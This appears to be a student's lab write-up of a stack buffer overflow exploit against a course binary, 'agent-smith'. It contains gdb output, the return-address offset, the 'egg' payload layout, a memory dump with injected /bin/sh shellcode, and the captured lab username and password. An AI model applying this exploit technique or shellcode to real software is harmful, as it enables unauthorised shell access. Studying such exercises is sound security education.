@@ -1,0 +1,73 @@
+In Question 3, the vulnerability is a buffer overflow by using fread in C programming,
+since the first Byte of the file is the size, I can set the size bigger than "msg".
+Therefore, I can inject my shell code to the memory using buffer "msg", and overwrite the return address.
+
+This is how I do it:
+_First: run "invoke -d agent-smith" to debug.
+break at line 15 to find out about eip --> 0x0804857b
+
+Breakpoint 1, display (path=0xbffff88e "anderson.txt") at agent-smith.c:15
+15	  n = fread(msg, 1, size, file);
+(gdb) info frame
+Stack level 0, frame at 0xbffff6e0:
+ eip = 0x8048517 in display (agent-smith.c:15); saved eip 0x804857b
+ called by frame at 0xbffff700
+ source language c.
+ Arglist at 0xbffff6d8, args: path=0xbffff88e "anderson.txt"
+ Locals at 0xbffff6d8, Previous frame's sp is 0xbffff6e0
+ Saved registers:
+  ebp at 0xbffff6d8, eip at 0xbffff6dc
+
+_Second: I found out that the different between return address (value: 0x804857b) at 0xbffff68c and "msg" (0xbffff648) address is 148 Bytes.
+Before inject the shell code
+
+(gdb) x/40x msg
+0xbffff648:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff658:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff668:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff678:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff688:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff698:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff6a8:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff6b8:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff6c8:	0x00000001	0x0804b008	0x00000002	0xbffff794
+0xbffff6d8:	0xbffff6f8	0x0804857b	0xbffff88e	0x00000000
+
+_ Third: I want to put my shell code 8 Bytes after the return address(0xbffff6dc).
+Therefore, my shell code will be write at address 0xbffff6dc + 0x8 = 0xbffff6e4 
+This is how my "egg" file will print in this order:
+	+ 1 Byte to read the size of the file, "xff"
+	+ 148 Bytes different between return address and "msg" address, inject 148 of letter "A"
+	+ 4 Bytes for the address (0xbffff6e4) where my shell code begin 
+	+ 4 Bytes , inject 4 of letter "A"
+	+ Inject 45 Bytes of my shell code
+Totally, the size of "egg" file is 202 Bytes
+
+_ Fourth: run ./exploit
+After inject the shell code
+(gdb) x/64x msg
+0xbffff648:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff658:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff668:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff678:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff688:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff698:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6a8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6b8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6c8:	0x000000ca	0x41414141	0x41414141	0x41414141
+0xbffff6d8:	0x41414141	0xbffff6e4	0x41414141	0x895e1feb
+0xbffff6e8:	0xc0310876	0x89074688	0x0bb00c46	0x4e8df389
+0xbffff6f8:	0x0c568d08	0xdb3180cd	0xcd40d889	0xffdce880
+0xbffff708:	0x622fffff	0x732f6e69	0x00000a68	0xbffff71c
+0xbffff718:	0xbffff7a0	0x00000000	0x0804824c	0xb7fd2000
+0xbffff728:	0x00000000	0x00000000	0x00000000	0x949c5206
+0xbffff738:	0xa3db7616	0x00000000	0x00000000	0x00000000
+
+Once inside smith,
+$ whoami
+brown
+$ cat README
+Never send a human to do a machine's job.
+
+user: brown
+pass: +^K2dUc0
